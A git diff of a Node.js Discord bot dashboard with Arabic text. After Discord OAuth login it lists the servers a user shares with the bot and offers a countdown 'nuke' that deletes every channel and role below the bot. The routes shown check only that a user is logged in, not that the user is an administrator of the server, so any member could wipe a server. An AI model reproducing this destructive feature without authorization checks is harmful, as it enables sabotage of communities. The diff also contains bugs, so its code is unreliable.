@@ -1,7 +1,7 @@
 require('dotenv').config();
 const express = require('express');
 const session = require('express-session');
-const MongoStore = require('connect-mongo');
+const MongoStore = require('connect-mongo').default || require('connect-mongo');
 const { Client, GatewayIntentBits } = require('discord.js');
 const axios = require('axios');
 
@@ -13,7 +13,11 @@ const client = new Client({
     intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers]
 });
 
-client.login(process.env.TOKEN);
+client.login(process.env.TOKEN).catch(error => {
+    console.error('فشل تسجيل دخول البوت:', error.message);
+    process.exit(1);
+});
+
 
 client.once('ready', () => {
     console.log(`🤖 تم تشغيل البوت بنجاح باسم: ${client.user.tag}`);
@@ -21,7 +25,7 @@ client.once('ready', () => {
 
 // 2. إعداد الجلسات وحفظها في قاعدة بيانات MongoDB لضمان استقرار راندر
 app.use(session({
-    secret: 'render-dashboard-secure-key',
+    secret: process.env.SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
     store: MongoStore.create({ mongoUrl: process.env.MONGO_CONNECTION_STRING })
@@ -58,7 +62,13 @@ const htmlTemplate = (content) => `
 // الصفحة الرئيسية لتسجيل الدخول
 app.get('/', (req, res) => {
     if (!req.session.user) {
-        const loginUrl = `https://discord.com{process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.CALLBACK_URL)}&response_type=code&scope=identify%20guilds`;
+        const loginUrl =
+            `https://discord.com/oauth2/authorize` +
+            `?client_id=${process.env.CLIENT_ID}` +
+            `&redirect_uri=${encodeURIComponent(process.env.CALLBACK_URL)}` +
+            `&response_type=code` +
+            `&scope=identify%20guilds`;
+
         return res.send(htmlTemplate(`
             <h1>مرحباً بك في لوحة التحكم 🛠️</h1>
             <p>سجل دخولك لتظهر لك السيرفرات المشتركة مع البوت وتبدأ التجربة.</p>
@@ -66,36 +76,73 @@ app.get('/', (req, res) => {
             <a class="btn" href="${loginUrl}">تسجيل الدخول عبر ديسكورد</a>
         `));
     }
+
     res.redirect('/dashboard');
 });
-
 // رابط استقبال البيانات بعد تسجيل الدخول (Callback)
 app.get('/auth/callback', async (req, res) => {
-    const code = req.query.code;
-    if (!code) return res.send('فشل تسجيل الدخول التلقائي');
+    const { code, error } = req.query;
+
+    if (error) {
+        return res.status(400).send('تم إلغاء تسجيل الدخول عبر Discord.');
+    }
+
+    if (!code || typeof code !== 'string') {
+        return res.status(400).send(
+            'لم يتم استلام رمز تسجيل الدخول من Discord.'
+        );
+    }
 
     try {
-        const tokenResponse = await axios.post('https://discord.com', new URLSearchParams({
-            client_id: process.env.CLIENT_ID,
-            client_secret: process.env.CLIENT_SECRET,
-            grant_type: 'authorization_code',
-            code: code,
-            redirect_uri: process.env.CALLBACK_URL,
-        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
+        const tokenResponse = await axios.post(
+            'https://discord.com/api/oauth2/token',
+            new URLSearchParams({
+                client_id: process.env.CLIENT_ID,
+                client_secret: process.env.CLIENT_SECRET,
+                grant_type: 'authorization_code',
+                code,
+                redirect_uri: process.env.CALLBACK_URL,
+            } ),
+            {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+            }
+        );
 
-        const userResponse = await axios.get('https://discord.com', {
-            headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` }
-        });
+        const accessToken = tokenResponse.data.access_token;
 
-        const guildsResponse = await axios.get('https://discord.com/guilds', {
-            headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` }
-        });
+        const userResponse = await axios.get(
+            'https://discord.com/api/users/@me',
+            {
+                headers: {
+                    Authorization: `Bearer ${accessToken}`,
+                },
+            }
+         );
+
+        const guildsResponse = await axios.get(
+            'https://discord.com/api/users/@me/guilds',
+            {
+                headers: {
+                    Authorization: `Bearer ${accessToken}`,
+                },
+            }
+         );
 
         req.session.user = userResponse.data;
         req.session.guilds = guildsResponse.data;
-        res.redirect('/dashboard');
+
+        return res.redirect('/dashboard');
     } catch (error) {
-        res.send('حدث خطأ في الاتصال بسيرفرات ديسكورد، تأكد من الإعدادات ومتغيرات البيئة.');
+        console.error(
+            'OAuth callback error:',
+            error.response?.data || error.message
+        );
+
+        return res.status(500).send(
+            'حدث خطأ في الاتصال مع Discord. راجع إعدادات OAuth ومتغيرات البيئة.'
+        );
     }
 });
 
@@ -103,8 +150,14 @@ app.get('/auth/callback', async (req, res) => {
 app.get('/dashboard', (req, res) => {
     if (!req.session.user) return res.redirect('/');
 
-    // جلب السيرفرات المشتركة بين قائمة سيرفرات المستخدم وسيرفرات البوت الحالية بدون شروط إضافية
-    const commonGuilds = req.session.guilds.filter(guild => client.guilds.cache.has(guild.id));
+const userGuilds = Array.isArray(req.session.guilds)
+    ? req.session.guilds
+    : [];
+
+const commonGuilds = userGuilds.filter(guild =>
+    client.guilds.cache.has(guild.id)
+);
+
 
     let listHtml = '<h1>اختر سيرفر التجربة ⚙️</h1>';
     listHtml += '<p>هذه هي السيرفرات التي تجمعك مع البوت حالياً:</p><br>';
@@ -116,7 +169,7 @@ app.get('/dashboard', (req, res) => {
             listHtml += `
                 <div class="server-card">
                     <span><strong>${guild.name}</strong> (ID: ${guild.id})</span>
-                    <a class="btn btn-danger" href="/manage/${guild.id}">تنظيف السيرفر</a>
+                    <a class="btn" href="/manage/${guild.id}">عرض الإدارة</a>
                 </div>
             `;
         });
@@ -124,48 +177,76 @@ app.get('/dashboard', (req, res) => {
     res.send(htmlTemplate(listHtml));
 });
 
-// صفحة تأكيد الحذف وبدء العد التنازلي (10 ثواني)
+// صفحة عرض وإدارة السيرفر (حذف حقيقي)
 app.get('/manage/:guildId', (req, res) => {
-    if (!req.session.user) return res.redirect('/');
+    if (!req.session.user) {
+        return res.redirect('/');
+    }
+
     const guildId = req.params.guildId;
     const guild = client.guilds.cache.get(guildId);
-    if (!guild) return res.send('البوت غير مضاف في هذا السيرفر حالياً');
 
-    res.send(htmlTemplate suicide(`
-        <h1>تطهير السيرفر: ${guild.name} ⚠️</h1>
-        <p>عند الضغط على الزر، سيبدأ عد تنازلي مدته 10 ثوانٍ، بعدها سيتم <strong>حذف كل القنوات والرتب الأقل من البوت</strong> بالكامل!</p>
-        <br>
-        <button class="btn btn-danger" id="startBtn" onclick="startDestruction()">ابدأ الحذف الشامل</button>
+    if (!guild) {
+        return res.send('البوت غير مضاف في هذا السيرفر حاليًا.');
+    }
+
+    return res.send(htmlTemplate(`
+        <h1>تطهير السيرفر الحقيقي: ${guild.name} ⚠️</h1>
+        <p>تحذير: هاد الحذف حقيقي للتجارب! رح يتم مسح كل القنوات والرتب الأقل من البوت.</p>
+          
+
+        <button class="btn btn-danger" id="startBtn" onclick="startNuke()">
+            بدء التدمير الشامل
+        </button>
         <div class="countdown" id="timer" style="display:none;"></div>
 
         <script>
-            function startDestruction() {
-                document.getElementById('startBtn').style.display = 'none';
+            function startNuke() {
+                const button = document.getElementById('startBtn');
                 const timerDiv = document.getElementById('timer');
+
+                button.style.display = 'none';
                 timerDiv.style.display = 'block';
-                
+
                 let timeLeft = 10;
-                timerDiv.innerText = "سيتم تدمير القنوات والرتب خلال: " + timeLeft + " ثوانٍ";
-                
+                timerDiv.innerText =
+                    'سيتم بدء الحذف الشامل خلال: ' + timeLeft + ' ثوانٍ';
+
                 const interval = setInterval(async () => {
                     timeLeft--;
+
                     if (timeLeft <= 0) {
                         clearInterval(interval);
-                        timerDiv.innerText = "جاري الحذف والتطهير الآن... يرجى الانتظار";
-                        
-                        // إرسال طلب الحذف للخلفية
-                        const response = await fetch('/api/nuke/${guildId}', { method: 'POST' });
-                        const result = await response.json();
-                        alert(result.message);
+                        timerDiv.innerText =
+                            'جاري حذف وتطهير كل القنوات والرتب الآن...';
+
+                        try {
+                            const response = await fetch(
+                                '/api/nuke/' + guildId,
+                                { method: 'POST' }
+                            );
+
+                            const result = await response.json();
+                            alert(
+                                result.message +
+                                '\\nالقنوات الممسوحة: ' + result.counts.channels +
+                                '\\nالرتب الممسوحة: ' + result.counts.roles
+                            );
+                        } catch (error) {
+                            alert('تعذر تنفيذ عملية الحذف الفعلي.');
+                        }
+
                         window.location.href = '/dashboard';
                     } else {
-                        timerDiv.innerText = "سيتم تدمير القنوات والرتب خلال: " + timeLeft + " ثوانٍ";
+                        timerDiv.innerText =
+                            'سيتم بدء الحذف الشامل خلال: ' + timeLeft + ' ثوانٍ';
                     }
                 }, 1000);
             }
         </script>
     `));
 });
+
 
 // الـ API المسؤول عن مسح القنوات والرتب
 app.post('/api/nuke/:guildId', async (req, res) => {
